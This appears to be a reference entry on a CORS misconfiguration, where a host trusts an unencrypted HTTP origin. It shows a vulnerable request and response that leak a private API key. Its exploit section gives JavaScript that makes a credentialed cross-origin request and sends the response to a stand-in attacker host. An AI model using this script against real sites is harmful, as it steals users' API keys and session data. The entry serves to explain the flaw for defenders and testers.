# HTTP origin

## Description
Host allows resource sharing over an unencrypted connection (HTTP)

Risky trust dependency, a MITM attacker may steal HTTPS site secrets

**Severity**: Low

## Exploit 
Sniff requests made over the unencrypted channel.

### Example
**Vulnerable Implementation** 
```http
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: http://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

**Exploit**  
This exploit requires that the respective JS script is hosted at `evil.com`
```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```
